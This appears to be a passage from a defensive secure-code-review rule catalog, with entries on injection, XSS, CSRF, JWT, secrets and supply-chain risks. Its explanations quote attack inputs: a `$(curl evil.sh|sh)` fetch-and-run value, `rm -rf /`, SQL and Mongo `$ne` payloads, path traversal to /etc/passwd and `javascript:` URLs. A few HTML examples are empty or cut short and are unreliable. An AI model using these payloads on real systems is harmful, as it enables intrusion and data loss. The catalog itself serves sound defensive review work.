terms.fix: Bound it: an LRU with a max size and/or a TTL that evicts. Prefer a shared cache with eviction over an unbounded in-process structure.

example.before:
const memo = new Map();
memo.set(userId, expensive(data)); // grows forever
example.after:
import { LRUCache } from 'lru-cache';
const memo = new LRUCache({ max: 10_000, ttl: 60_000 }); // bounded

trips: const cache = new Map(); function get(k){ if(!cache.has(k)) cache.set(k, load(k)); return cache.get(k); }
clean: const cache = new LRUCache({ max: 10000, ttl: 60000 });

terms.title: Web Vitals tracked at a budget level (LCP/CLS/INP targets), mechanics routed to frontend-review

signals: a change to a page's critical render path with no Web Vitals budget
no LCP/CLS/INP target asserted for a user-facing route

terms.smell: A user-facing route ships changes to its critical path with no Web Vitals budget (LCP/CLS/INP targets) tracked or asserted.
terms.why: Without a budget, Core Web Vitals drift below target one PR at a time and the regression is only noticed in the field — worse LCP/CLS/INP for real users on real devices.
terms.fix: Track LCP/CLS/INP against explicit targets (LCP <= 2.5s, CLS <= 0.1) via Lighthouse CI assertions and field/RUM; route the render-internals fixes to frontend-review.

terms.title: Login/signup/reset responses don't enumerate accounts

signals: distinct 'no such user' vs 'wrong password' messages
'email already in use' on signup
early return when the user is missing (timing leak)

terms.smell: Auth responses differ by which factor failed — distinct messages or status codes for unknown-user vs wrong-password, "email already in use" on signup, or a fast early return when the user is missing (timing side channel).
terms.why: An attacker harvests valid accounts by comparing messages, status codes, or response timing, then targets them for stuffing and phishing (CWE-204 / A07).
terms.fix: Return an identical response regardless of which factor failed ("Invalid credentials"; "if that email exists, we sent a link"). Keep timing constant by doing a dummy hash verify when the user is missing.

example.before:
if (!user) return res.status(404).json({ error: 'No such user' });
if (!ok)   return res.status(401).json({ error: 'Wrong password' });
example.after: if (!user || !ok) return res.status(401).json({ error: 'Invalid credentials' });

trips: if (!user) return res.status(404).json({ error: 'No such user' });

terms.title: Auth/reset/MFA/token endpoints rate-limited with lockout/backoff

signals: a login/reset/MFA/token endpoint with no limiter
unlimited password or code attempts

terms.smell: A login, password-reset, MFA-verify, or token endpoint accepts unlimited attempts with no per-account/per-IP rate limit, lockout, or backoff.
terms.why: Credential stuffing and brute force run at high speed; the same gap enables MFA-code and reset-token guessing (CWE-307 / A07/A04) — accounts fall without any other bug.
terms.fix: Apply a per-account and per-IP limiter with exponential backoff and lockout after N failures on login, reset, MFA verify, and token endpoints; alert on spikes.

example.before: app.post('/login', verifyPassword);
example.after: app.post('/login', loginLimiter, verifyPassword);

terms.title: Authenticated encryption (GCM/AEAD); no ECB; no home-rolled crypto

signals: aes-*-ecb cipher mode
CBC without a MAC / unauthenticated encryption
a bespoke encrypt() implementation

terms.smell: Encryption uses ECB mode, an unauthenticated mode (CBC/CTR with no MAC), or a home-rolled scheme instead of an AEAD construction.
terms.why: ECB leaks plaintext structure (identical blocks encrypt identically); unauthenticated modes are malleable and vulnerable to padding-oracle/bit-flipping attacks; home-rolled crypto almost always has a fatal flaw — data disclosure or forgery (CWE-327 / A02).
terms.fix: Use an AEAD mode (AES-GCM, ChaCha20-Poly1305) via a vetted library so encryption is authenticated; never ECB; never write your own primitive.

example.before: const c = crypto.createCipheriv('aes-256-ecb', key, null);
example.after: const c = crypto.createCipheriv('aes-256-gcm', key, iv); // + auth tag

terms.title: Role / permission / tenant comes from the session or token, never the request

signals: role, isAdmin, tenantId, userId read from req.body or req.query
an update spreads the request body into a user/account row

terms.smell: An authorization-relevant field — `role`, `isAdmin`, `tenantId`, `userId` — is taken from the request body or query and used to grant privilege or select the acting/owning entity.
terms.why: The user sends `{"role":"admin"}` (or `isAdmin:true`) to their own profile-update endpoint and self-promotes — full account/tenant takeover (CWE-269 / A01). The same bug lets them set `userId`/`tenantId` to act as, or read the data of, someone else.
terms.fix: Derive authorization data server-side from the authenticated session/token only. Allowlist the editable fields; route privilege changes through a separate admin-only, authorized endpoint.

example.before: await db.user.update({ where: { id: req.user.id }, data: req.body }); // body has role
example.after:
const { name, email } = req.body;
await db.user.update({ where: { id: req.user.id }, data: { name, email } });

trips: await db.user.update({ where: { id: req.user.id }, data: req.body });
const tenant = req.query.tenantId; return db.data.find({ tenant });
clean: const { name, email } = req.body; await db.user.update({ where: { id: req.user.id }, data: { name, email } });

terms.title: No secrets exposed to fork/untrusted CI runs; no secrets echoed

signals: pull_request_target running fork PR code with secrets present
a step that echoes env / uploads logs containing secrets
a self-hosted runner on a public repo

terms.smell: A workflow runs untrusted PR code (`pull_request_target`, or a self-hosted runner on a public repo) with repo secrets in the environment, or a step echoes env / uploads artifacts that could contain secrets.
terms.why: An attacker's fork PR reads those secrets — prints or exfiltrates them — because the untrusted code executes with the secrets present (A08). Deploy keys and cloud creds leak from a single drive-by PR.
terms.fix: Don't expose secrets to workflows triggered by untrusted PRs; gate deploy/secret steps to trusted branches or require maintainer approval; prefer OIDC short-lived credentials over stored long-lived secrets; never echo secrets.

example.before:
on: pull_request_target
steps: [{ run: ./build.sh, env: { DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }} } }]
example.after: on: pull_request          # no secrets for fork PRs; deploy gated to main

trips: on: pull_request_target  # runs fork code with secrets
clean: on: pull_request  # untrusted PRs get no secrets

terms.title: No secret reachable from client code or a *_PUBLIC_/VITE_/REACT_APP_ var

signals: NEXT_PUBLIC_/VITE_/REACT_APP_ prefixing a secret value
process.env.SECRET_* referenced in a frontend bundle

terms.smell: A secret is placed behind a browser-exposed env prefix (`NEXT_PUBLIC_`, `VITE_`, `REACT_APP_`) or otherwise referenced in code that gets bundled to the client.
terms.why: The frontend bundle is downloaded by every visitor; "View Source"/devtools reveals the value. These prefixes are exposed to the browser by design, so a secret key behind one is leaked to every user (CWE-200 / A02). Only publishable/public keys belong in client code.
terms.fix: Keep the secret server-side; have the client call your backend, which calls the third-party API. Check that source maps don't ship server bundles.

example.before: NEXT_PUBLIC_STRIPE_SECRET=sk_live_...
example.after: # server-only: STRIPE_SECRET_KEY=sk_live_...  (never NEXT_PUBLIC_)

terms.title: No shell command built from input — execFile/spawn with an arg array

signals: child_process.exec / os.system / backticks with input
a shell string assembled from a request value

terms.smell: User data is placed into a shell command string (`exec`, `os.system`, backticks, `sh -c`) rather than passed as an argument array to a shell-less spawn.
terms.why: `file = a.png; rm -rf / #` or `$(curl evil.sh|sh)` runs arbitrary commands as the app — RCE. Shell metacharacters (`; | & $ \` > <`) are the vector (CWE-78 / A03).
terms.fix: Avoid the shell: use `execFile`/`spawn` with the args as an array so they can't be reinterpreted. Better, use a library instead of shelling out. If a binary is unavoidable, allowlist argument values and validate filenames; never pass input through `sh -c`.

example.before: exec(`convert ${req.query.file} out.png`);
example.after: execFile('convert', [req.query.file, 'out.png']);

terms.title: No .env / id_rsa / *.pem / keystore committed

signals: a .env / id_rsa / *.pem / keystore added in the diff
credentials.yml.enc.key or a service-account json committed

terms.smell: A secret-bearing file — `.env`, `id_rsa`, `*.pem`/`*.p12` keystore, a service-account JSON, an encrypted-credentials key — is added to the repo.
terms.why: These hold live secrets and live forever in git history even after deletion. A leaked `.env` or `id_rsa` is immediate, full access to whatever it unlocks (CWE-312/540).
terms.fix: Add to `.gitignore`; commit only a placeholder `.env.example`; load real values from a secret manager at runtime. If already committed, rotate the secret (it's compromised) then scrub history (`git filter-repo`/BFG) and force-push — a delete commit does not remove it from history.

example.before: git add .env id_rsa gcp-service-account.json
example.after: echo -e ".env\nid_rsa\n*.pem" >> .gitignore   # commit .env.example with placeholders

terms.title: Content-Security-Policy present, without unsafe-inline

signals: no Content-Security-Policy header set
CSP containing 'unsafe-inline' or 'unsafe-eval'

terms.smell: Responses ship no Content-Security-Policy, or a CSP that includes `unsafe-inline` / `unsafe-eval`, so inline scripts run freely.
terms.why: CSP is the defense-in-depth that limits the blast radius of an XSS that slips through encoding; without it (or with `unsafe-inline`) any injected script executes with no restriction (A03/A05).
terms.fix: Set a CSP that disallows `unsafe-inline`/`unsafe-eval`, uses nonces/hashes for needed inline scripts, and restricts `script-src`/`connect-src` to trusted origins.

example.before: // no CSP header
example.after: res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'");

terms.title: Output encoded per context; href/src schemes validated

signals: user input placed into an href/src attribute
input interpolated inside a <script> or inline event handler
HTML-encoding used where a JS/URL context is needed

terms.smell: User data is encoded for the wrong context — placed into an `href`/`src` without scheme validation, or inside a `<script>` / inline event handler where HTML-encoding doesn't apply.
terms.why: Input in `href`/`src` enables `javascript:` URLs that execute on click; input inside a JS string or URL context that was only HTML-encoded still breaks out and runs — XSS (CWE-79 / A03).
terms.fix: Encode for the exact sink context (HTML body vs attribute vs JS string vs URL). Validate that `href`/`src` schemes are `https:`/`mailto:`; never trust HTML-encoding to make a value safe inside a script or event-handler context.

example.before: link // userUrl = "javascript:alert(1)"
example.after: const safe = /^https?:|^mailto:/.test(userUrl) ? userUrl : '#'; link

terms.title: Auth cookies set HttpOnly, Secure, and SameSite

signals: res.cookie('session', ...) without flags
Set-Cookie missing HttpOnly/Secure/SameSite

terms.smell: A session/auth cookie is set without `HttpOnly`, `Secure`, and `SameSite`.
terms.why: No `HttpOnly` lets any XSS read the session via `document.cookie`; no `Secure` leaks it over plaintext HTTP; no `SameSite` sends it on cross-site requests, enabling CSRF (CWE-1004/614/1275 / A05).
terms.fix: Set `httpOnly: true, secure: true, sameSite: 'lax'` (or `'strict'` for sensitive apps), and scope `path`/`domain` tightly.

example.before: res.cookie('session', id);
example.after: res.cookie('session', id, { httpOnly: true, secure: true, sameSite: 'lax', path: '/' });

clean: res.cookie('session', id, { httpOnly: true, secure: true, sameSite: 'lax' });

terms.title: Randomness for tokens/keys uses a CSPRNG, not Math.random

signals: Math.random() used to build a token / id / key / OTP
a predictable RNG for password-reset or session tokens

terms.smell: A security-sensitive value — session id, password-reset token, API key, OTP, nonce — is generated with a non-cryptographic RNG (`Math.random`, `rand()`).
terms.why: Non-crypto PRNGs are predictable: an attacker who observes a few outputs reconstructs the state and forges the next token, taking over sessions or reset flows (CWE-330 / A02).
terms.fix: Use a CSPRNG: `crypto.randomBytes`/`crypto.randomUUID` (Node), `secrets` (Python), `crypto/rand` (Go).

example.before: const token = Math.random().toString(36).slice(2);
example.after: const token = crypto.randomBytes(32).toString('hex');

terms.title: CSRF protection on cookie-authenticated state-changing requests

signals: a state-changing POST/PUT/DELETE authenticated by an ambient cookie
no anti-CSRF token or SameSite on a cookie-auth form

terms.smell: A state-changing request (POST/PUT/PATCH/DELETE) authenticated only by an ambient cookie has no anti-CSRF defense.
terms.why: An attacker's page auto-submits a request to your endpoint; the browser attaches the victim's cookie and the action executes as them — change email, reset password, take over the account (CWE-352 / A01).
terms.fix: Add a synchronizer/anti-CSRF token verified per session on every state-changing method, plus SameSite cookies as defense-in-depth. Header-token APIs that don't use cookie auth are largely immune. Verify coverage across all mutating methods, not just some.

example.before: app.post('/account/email', updateEmail);
example.after: app.post('/account/email', csrfProtection, updateEmail);

trips: app.post('/account/email', updateEmail); // cookie auth, no csrf

terms.title: dangerouslySetInnerHTML / v-html / innerHTML with user data is sanitized

signals: dangerouslySetInnerHTML / v-html / bypassSecurityTrustHtml
el.innerHTML = / document.write with a variable

terms.smell: User-influenced data is injected as raw HTML via `dangerouslySetInnerHTML`, `v-html`, Angular's `bypassSecurityTrust*`, `innerHTML`, or `document.write`, bypassing the framework's auto-escaping without sanitization.
terms.why: `` runs in every viewer's browser — session theft, actions as the victim, keylogging. Stored variants persist and hit every viewer (CWE-79 / A03).
terms.fix: Render user data as text and let the framework escape it. If you must render HTML, sanitize with a vetted library (DOMPurify) and a strict allowlist — never write your own sanitizer.

example.before: <div dangerouslySetInnerHTML={{ __html: comment }} />
example.after:
{comment}
// or:

terms.title: Added deps' install/lifecycle scripts reviewed; none surprising

signals: a new/updated dep that adds a preinstall/install/postinstall script
a minor/patch bump that newly introduces a lifecycle script

terms.smell: An added or updated dependency carries a `preinstall`/`install`/`postinstall` lifecycle script — especially a minor/patch bump that newly introduces one.
terms.why: Lifecycle scripts run automatically with your privileges during `npm install`, in dev and in CI where tokens and secrets are present — the classic exfiltration vector for a compromised package (CWE-506 / A08).
terms.fix: Review the install scripts of any added/updated dep (`npm pack` and read, or inspect on the registry). In CI install with scripts disabled where feasible (`npm ci --ignore-scripts`) and allowlist the few that genuinely need them.

example.before: "scripts": { "postinstall": "node ./collect.js" }
example.after: // no lifecycle script, or reviewed + allowlisted; CI uses --ignore-scripts

terms.title: Uploads validated by content and size, stored non-executable, random names

signals: writing an upload using file.originalname
trusting the client Content-Type/extension
storing an upload under the webroot

terms.smell: An upload is stored using the client-provided name/type, in a web-served executable path, with no content-based type check or size cap.
terms.why: Uploading `shell.php`/`.jsp`/`.aspx` into an executable web path makes requesting it run code — RCE. `Content-Type` and extension are attacker-controlled; a `../` in the name enables traversal; huge files cause DoS (CWE-434 / A04/A08).
terms.fix: Validate the real type by magic bytes, enforce a size cap, generate a random name (never trust `originalname`), store on object storage or a non-executable dir, and serve read-only with `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.

example.before: fs.writeFile(`/var/www/public/${file.originalname}`, file.buffer);

clean: if (!ALLOWED_MIME.has(detectFromMagicBytes(file.buffer))) return res.sendStatus(415); await storeToBucket(crypto.randomUUID()+ext, file.buffer);

terms.title: Admin/privileged endpoints enforce authz when called directly

signals: an admin/internal endpoint reachable by URL but not linked in the UI
authz assumed because the route is 'hidden'

terms.smell: A privileged or admin function is protected only by being absent from the normal UI/nav, with no explicit role check on the endpoint itself when it is called directly.
terms.why: Security-by-obscurity: an attacker who guesses or discovers the path (`/admin/exportUsers`, `POST /internal/refund`) invokes it and performs the privileged action, because the function never checked their role (missing function-level access control, A01).
terms.fix: Enforce an explicit server-side role/permission check on every privileged endpoint, independent of whether the UI exposes it. Fail closed.

terms.title: No hardcoded credentials/keys/tokens/private keys in source

signals: an API key / password / token literal in source
sk_live_, AKIA, -----BEGIN PRIVATE KEY-----
a connection string with an inline password

terms.smell: A credential, API key, token, DB password, or private key is written as a literal in source.
terms.why: Everyone with repo read access — employees, contractors, every fork, every CI log, and anyone if the repo ever goes public — has the live key, and it can't be rotated without a code change/deploy (CWE-798 / A02). A "test"/"dev" key is still a finding if it's live.
terms.fix: Load from the environment / a secret manager at runtime and fail fast if absent. If a real secret was committed, rotate it (assume compromised) and scrub git history — deletion alone doesn't remove it.

example.before: const stripe = new Stripe('sk_live_4eC39H...REDACTED');
example.after: const stripe = new Stripe(requireEnv('STRIPE_SECRET_KEY'));

terms.title: Object reads/writes verify ownership — no IDOR via :id

signals: a lookup by an id taken from the URL/params/body
findById / findByPk without a tenant or owner filter
nested resource like /users/:uid/cards/:cid

terms.smell: A handler looks up an object by an id from the request (`findById(req.params.id)`) and returns/updates it without scoping the query to the current user or checking ownership.
terms.why: Any authenticated user increments `:id` to enumerate and read or modify every other user's objects — invoices, orders, messages — a mass data-exfiltration or tampering bug (CWE-639 / A01). Authentication is not authorization for *this* object; a hard-to-guess UUID is not protection (it leaks via logs, referrers, shares).
terms.fix: Scope every object read/write to the owner in the query itself, or check ownership after load and return 404 on a miss (404, not 403, avoids confirming the id exists). Apply the same filter to UPDATE/DELETE and to every level of a nested resource.

example.before:
app.get('/api/invoices/:id', auth, async (req, res) =>
  res.json(await db.invoice.findById(req.params.id)));

clean: const inv = await db.invoice.findOne({ id: req.params.id, ownerId: req.user.id }); if (!inv) return res.sendStatus(404);
const card = await db.card.findOne({ id: cid, userId: req.user.id });

terms.title: Default credentials removed; directory listing off

signals: a default admin/admin or sample credential left in config
autoindex on / directory listing enabled on a static server

terms.smell: A service ships with default/sample credentials still active, or a static/file server has directory listing (autoindex) enabled.
terms.why: Default creds are the first thing an attacker tries — public lists of them exist — and give an instant foothold; directory listing exposes files never meant to be browsed (backups, configs, keys) for info disclosure (CWE-1188/548 / A05).
terms.fix: Remove or force-change default credentials on first run; disable directory listing/autoindex; restrict which paths are served.

example.before:
POSTGRES_USER: postgres
POSTGRES_PASSWORD: postgres
example.after: POSTGRES_PASSWORD: ${DB_PASSWORD}   # from secret manager, not a default

terms.title: No deserialization of untrusted data with code-capable formats

signals: pickle.loads / yaml.load (non-safe) on request data
ObjectInputStream.readObject on untrusted bytes
Marshal.load / unserialize on input

terms.smell: Attacker-controlled bytes are deserialized with a code-capable format — `pickle.loads`, `yaml.load` (full loader), Java native `readObject`, Ruby `Marshal.load`, PHP `unserialize`.
terms.why: These formats reconstruct arbitrary objects and invoke methods during load; a crafted payload triggers a gadget chain to RCE (CWE-502 / A08).
terms.fix: Use a data-only format (`json.loads`) or the safe loader (`yaml.safe_load`). If a rich format is unavoidable, sign the payload and verify before deserializing, and restrict allowed types.

example.before: data = pickle.loads(request.body)
example.after: data = json.loads(request.body)

terms.title: JWT signature verified, alg pinned, exp set and checked, strong key

signals: jwt.verify without an algorithms allowlist
jwt.sign without expiresIn
a short/hardcoded JWT secret

terms.smell: A JWT is verified without pinning the algorithm, signed without an expiry, or signed with a weak/guessable secret — or the payload carries secrets/PII.
terms.why: `alg:none` lets an attacker send an unsigned token a lax verifier accepts; RS256->HS256 confusion lets them sign with the public key as an HMAC secret; no `exp` means a once-leaked token works forever; a weak secret is brute-forced offline to mint admin tokens (CWE-347 / A02/A07) — each is identity forgery / account takeover.
terms.fix: Pin the algorithm with an explicit allowlist on verify, require and check `exp`, use a >=256-bit CSPRNG secret or an asymmetric key, and keep secrets/PII out of the (base64, unencrypted) payload.

example.before:
jwt.sign({ sub: id }, 'secret');            // no exp, weak secret
jwt.verify(token, secret);                  // no algorithms pin
example.after:
jwt.sign({ sub: id }, SECRET, { algorithm: 'HS256', expiresIn: '15m' });
jwt.verify(token, SECRET, { algorithms: ['HS256'] });

clean: jwt.sign({ sub: id }, SECRET, { algorithm: 'RS256', expiresIn: '15m' });

terms.title: No dependency (direct or transitive) with a known CVE

signals: a dependency added or bumped to a version with a published advisory
a wide range that can resolve to a vulnerable version

terms.smell: A dependency is added or pinned to a version with a public CVE, or a wide range that resolves to one — including transitive deps.
terms.why: The resolved version has a public advisory and often a working PoC (prototype pollution, SSRF, Log4Shell-class RCE). Attackers grep your lockfile for known-bad versions, they don't study your code (CWE-1104 / A06).
terms.fix: Run `npm audit --omit=dev` / `pip-audit` / `osv-scanner -r .`, bump to the patched version, re-run clean, and commit the updated lockfile. Check transitive deps too (`npm ls <pkg>`).

terms.title: Long-lived static credentials avoided; rotation possible

signals: a permanent full-scope API token used everywhere
a static long-lived cloud access key instead of OIDC/STS
code that bakes in a secret value rather than reading current value

terms.smell: A permanent, broadly-scoped static credential is introduced (a never-expiring API token, a long-lived cloud access key) or code bakes in a secret value rather than reading the current one at runtime.
terms.why: A static long-lived credential maximizes blast radius — one leak compromises everything until someone notices, with no automatic cutoff — and a baked-in copy means rotation requires a redeploy, so it rarely happens.
terms.fix: Prefer short-lived, auto-rotated credentials (OIDC workload identity, STS/assumed roles, time-boxed tokens), scoped to least privilege. Where static keys are unavoidable, document and automate rotation and read the current value at runtime.

terms.title: Only an explicit allowlist of fields bound from the request body

signals: Model.create(req.body) / update(req.body)
spread of the whole body into a persisted entity

terms.smell: The whole request body is bound to a model (`User.create(req.body)`, `update({...req.body})`) instead of an explicit allowlist of fields.
terms.why: The attacker adds fields the form never showed — `role:"admin"`, `verified:true`, `balance:99999`, `id` — and the binder writes them: privilege escalation or data tampering (CWE-915 / A08).
terms.fix: Allowlist the fields you accept (pick them explicitly, use a DTO or the framework's "fillable" list, or a zod/Joi schema that strips unknown keys). Never blocklist.

example.before: const user = await User.create(req.body);
example.after:
const { name, email } = req.body;
const user = await User.create({ name, email });

clean: const { name, email } = req.body; await User.create({ name, email });

terms.title: MFA enforced server-side; codes single-use, short-lived, rate-limited

signals: an MFA step that can be skipped by calling a later endpoint directly
reusable or non-expiring OTP codes
no MFA on admin/high-value accounts

terms.smell: MFA is enforced only in the UI flow (skippable by calling the post-MFA endpoint directly), codes are reusable or don't expire, backup codes are stored unhashed, or admin/high-value accounts have no MFA option.
terms.why: If the sensitive action doesn't itself require the verified second factor, an attacker with the password bypasses MFA by jumping straight to it. Reusable/long-lived codes and unhashed backup codes weaken the factor to near-useless (A07).
terms.fix: Enforce MFA server-side on the sensitive action, not just an earlier screen; make codes single-use, short-lived, and rate-limited; hash backup codes; bind and allow revocation of "remember this device" tokens.

trips: // /transfer works with a valid session even if MFA step was skipped

terms.title: NoSQL query input type-coerced; operator injection blocked

signals: a Mongo query built directly from req.body fields
no schema/type check before findOne with user values

terms.smell: A NoSQL (e.g. Mongo) query passes request fields straight into the filter where a string is expected, allowing an object with query operators.
terms.why: The attacker sends `{"user":"admin","pass":{"$ne":null}}`; `$ne:null` matches any non-null password and bypasses auth. `$gt`, `$regex`, and `$where` (JS execution) are similar (CWE-943 / A03).
terms.fix: Coerce/validate types at the boundary (`String(...)`, a Joi/zod schema) so operators can't be injected, and configure the driver to reject query operators in user data / disable `$where`.

example.before: db.users.findOne({ user: req.body.user, pass: req.body.pass });
example.after:
const user = String(req.body.user), pass = String(req.body.pass);
db.users.findOne({ user, pass });

clean: const user = String(req.body.user); db.users.findOne({ user, pass: String(req.body.pass) });

terms.title: OAuth redirect_uri exact-matched to an allowlist; state verified

signals: redirect using req.query.redirect_uri
OAuth callback with no state check
prefix/substring match on redirect_uri

terms.smell: An OAuth/OIDC flow redirects to a client-supplied `redirect_uri` without exact-matching it against a registered allowlist, or omits the `state` check on the callback.
terms.why: An open redirect on the callback lets the attacker point `redirect_uri` at a host they control and capture the auth `code`/token — account takeover. A missing `state` enables login CSRF (CWE-601 / A01).
terms.fix: Exact-match `redirect_uri` (scheme + host + path) against pre-registered URIs, not a prefix or substring; require and verify `state`; use PKCE for public clients.

example.before: res.redirect(req.query.redirect_uri + '?code=' + code);
example.after:
if (!REGISTERED_URIS.has(req.query.redirect_uri)) return res.sendStatus(400);
if (req.query.state !== session.oauthState) return res.sendStatus(400);

terms.title: Passwords hashed with bcrypt/argon2/scrypt — salted and slow

signals: createHash('md5'|'sha1'|'sha256') on a password
a password stored or compared in plaintext
a new signup/password-change flow

terms.smell: A password is stored via a fast hash (md5, sha1, sha256), an unsalted hash, or in plaintext, rather than a slow salted KDF.
terms.why: When the DB leaks — assume it will — fast hashes are cracked at billions of guesses/sec on a GPU and rainbow tables defeat unsalted hashes instantly (CWE-916 / A02/A07). Reused passwords then unlock the victim's other accounts.
terms.fix: Hash with bcrypt (cost >= 12), argon2id, or scrypt — each salts automatically and is deliberately slow. Never roll your own.

example.before: const hash = crypto.createHash('sha256').update(pw).digest('hex');
example.after:
const hash = await argon2.hash(pw);
const ok = await argon2.verify(hash, pw);

terms.title: File paths resolved and confirmed inside the intended base dir

signals: path.join(base, req.query.file) then read/write
sendFile / readFile with a user-supplied path segment

terms.smell: A user-controlled path segment is joined to a base directory and read/written without verifying the resolved path stays inside the base.
terms.why: `../../../../etc/passwd` (or an absolute path, or `..%2f`) escapes the base dir and reads arbitrary files — config, keys, `/etc/passwd`; on write paths it overwrites system files (CWE-22 / A01).
terms.fix: Resolve the target and confirm it still starts with the base dir + separator before using it; reject `..`, NUL bytes, and absolute paths. Prefer mapping an opaque id to a known filename over accepting paths at all.

example.before: res.sendFile(path.join('/var/data', req.query.file));

clean: const target = path.resolve(base, req.query.file); if (!target.startsWith(base + path.sep)) return res.sendStatus(400);

terms.title: Versions pinned; lockfile present, committed, and consistent

signals: "latest" or "*" in a manifest
a dependency change with no lockfile update committed

terms.smell: A dependency uses a floating range (`latest`, `*`) or the manifest changes with no committed, consistent lockfile.
terms.why: "It worked yesterday" — a new (or compromised) release is pulled on the next install/build with no review, and without a committed lockfile + integrity hashes the build isn't reproducible and a swapped package goes unnoticed (CWE-494 / A08).
terms.fix: Commit the lockfile (it pins exact versions and integrity hashes), install in frozen/CI mode (`npm ci`, `pnpm i --frozen-lockfile`, `pip install --require-hashes`), and avoid `latest`/`*`.

example.before: "some-lib": "latest"
example.after: "some-lib": "3.4.2"   // exact; lockfile committed

terms.title: Regexes on user input are linear / length-bounded (no ReDoS)

signals: nested/overlapping quantifiers like (a+)+ or (.*a){n}
a regex tested against unbounded user input

terms.smell: A regex with nested or overlapping quantifiers (`(a+)+`, `(\d+)*$`, `(.*a){20}`) is run against unbounded user input.
terms.why: A crafted string (many `a`s then a mismatch) causes exponential backtracking; one request pins a CPU core for seconds-to-minutes — denial of service (CWE-1333 / A04).
terms.fix: Cap input length before matching, remove overlapping quantifiers, or run untrusted-pattern matching on a linear-time engine (RE2).

example.before:
const re = /^(a+)+$/;
re.test(userInput);
example.after:
if (userInput.length > 256) return reject();
const re = /^[a-z0-9]+$/;

terms.title: Any exposed secret is rotated (not just removed) with a history scrub

signals: a diff that deletes a previously-committed secret
'removed the key' without a rotation step

terms.smell: A previously-committed secret is handled by deleting the line/file only, with no rotation and no history scrub.
terms.why: Once a secret has been pushed it is already public and permanent in git history; removing it in a new commit leaves the working value valid and still readable in history — the attacker window stays open (CWE-312).
terms.fix: Treat any exposed secret as compromised: rotate it first, then remove it from history (`git filter-repo`/BFG + coordinated force-push), then review access logs for misuse. Never echo the full value in the review.

clean: # key rotated in provider dashboard + git filter-repo run; new value in vault

terms.title: Secrets not passed as CLI args (visible in process list)

signals: --api-key=... / --password=... on a command line
a secret interpolated into a shell command argv

terms.smell: A secret is passed as a command-line argument (`mytool --api-key=sk_live_...`) rather than via an environment variable or a file read at runtime.
terms.why: Process arguments are world-readable on most systems (`ps aux`, `/proc`), and CI consoles and shell history capture them — any local user or a CI log leak exposes the secret (CWE-214).
terms.fix: Pass secrets via an environment variable or a file the tool reads at runtime, so they never appear in argv.

example.before: mytool --api-key=sk_live_abc123
example.after: API_KEY="$API_KEY" mytool

terms.title: Security-relevant events logged (auth, authz denials, admin) without secrets/PII

signals: auth success/failure or authz denial with no audit log
an admin action that isn't recorded

terms.smell: Security-relevant events — login success/failure, authorization denials, admin/privileged actions — are not logged, or are logged with secrets/PII in the payload.
terms.why: Without an audit trail a breach goes undetected and can't be investigated — you can't tell what the attacker touched (CWE-778 / A09). Conversely, logging secrets/PII turns the log store into a new leak target.
terms.fix: Log auth success/failure, authz denials, and admin actions with actor, action, and outcome — and no secrets/PII; ship them somewhere alertable.

trips: if (!ok) return res.sendStatus(401); // no audit log on repeated failures
clean: if (!ok) { audit.log('login.fail', { userId, ip }); return res.sendStatus(401); }

terms.title: Security headers set; CORS not wildcard-with-credentials

signals: missing HSTS / X-Content-Type-Options / frame-ancestors
Access-Control-Allow-Origin: * together with credentials

terms.smell: Responses omit key security headers (HSTS, `X-Content-Type-Options: nosniff`, CSP frame-ancestors/X-Frame-Options), or CORS is set to `*` while also allowing credentials.
terms.why: Missing HSTS allows SSL-strip downgrade; no `nosniff` allows MIME-confusion XSS; no frame-ancestors allows clickjacking; `Access-Control-Allow-Origin: *` with credentials lets any site read authenticated responses cross-origin (CWE-16/942 / A05) — data theft.
terms.fix: Set HSTS, `X-Content-Type-Options: nosniff`, and frame-ancestors/X-Frame-Options (via Helmet or equivalent); for CORS, reflect only an allowlist of origins when credentials are enabled — never `*` with credentials.

example.before: app.use(cors({ origin: '*', credentials: true }));
example.after:
app.use(cors({ origin: ALLOWED_ORIGINS, credentials: true }));
app.use(helmet());

clean: app.use(cors({ origin: ALLOWED_ORIGINS, credentials: true })); app.use(helmet());

terms.title: Every protected route/action has a server-side authz check that fails closed

signals: a route that mutates or returns protected data
the only permission check lives in the client/UI
an admin or privileged action

terms.smell: A protected route or action is guarded only by client-side logic (a hidden button, a disabled menu) or trusts a client-sent flag, with no server-side authorization enforced before the effect. Or an error/unknown-role branch defaults to allow.
terms.why: The client is attacker-controlled. They open devtools or curl the endpoint directly and perform the action anyway — delete any post, hit the admin route — because the UI check is UX, not security (CWE-602 / A01). A branch that defaults to allow on error opens the same gap.
terms.fix: Authorize on the server before the action, at every layer, for every object. Fail closed: unknown role, missing record, or thrown error must deny, never default to allow.

example.before:
// client hides the button; server trusts the call
app.delete('/api/posts/:id', auth, (req, res) => deletePost(req.params.id));
example.after: app.delete('/api/posts/:id', auth, requireRole('admin'), (req, res) => deletePost(req.params.id));

terms.title: Session id regenerated on login, invalidated on logout, timeouts set

signals: req.session.userId = ... set without regenerate()
logout that only clears the cookie client-side
no idle/absolute session timeout

terms.smell: On login the pre-auth session id is kept (no `regenerate`), logout only clears the client cookie instead of destroying the server session, or there is no idle/absolute timeout.
terms.why: Session fixation (CWE-384 / A07): an attacker plants a known session id, the victim logs in, and that id is now authenticated — the attacker rides it. A logout that trusts the client to discard the cookie leaves the session usable if the cookie was copied.
terms.fix: Regenerate the session id on any privilege change (login); destroy the session server-side on logout; set an idle timeout (e.g. 30 min) and an absolute cap.

example.before: req.session.userId = user.id;   // same id the attacker may have set
example.after:
req.session.regenerate(() => { req.session.userId = user.id; });
// logout: req.session.destroy();

trips: req.session.userId = user.id; // no regenerate on login

terms.title: SQL queries parameterized; identifiers allowlisted

signals: a query string built with template literals or concatenation of input
raw() / query() with interpolated values
an ORDER BY / table name coming from input

terms.smell: User input is concatenated or interpolated into a SQL string instead of passed as a bound parameter; or a table/column identifier comes from input without an allowlist.
terms.why: `name = ' OR '1'='1` returns all rows; `'; DROP TABLE users;--` destroys data; a UNION payload exfiltrates other tables; blind payloads extract data one bit at a time (CWE-89 / A03) — full database read/write.
terms.fix: Use parameterized queries / prepared statements so the driver binds values and they never alter structure. Identifiers can't be parameterized — map input identifiers through an allowlist of known names.

example.before: db.query(`SELECT * FROM users WHERE name = '${name}' AND tenant = ${tenant}`);
example.after: db.query('SELECT * FROM users WHERE name = $1 AND tenant = $2', [name, tenant]);

trips: cursor.execute("SELECT * FROM t WHERE id = " + user_id)

terms.title: Outbound URLs allowlisted; private/metadata IPs blocked; redirects refused

signals: fetch/axios/requests on a user-supplied URL
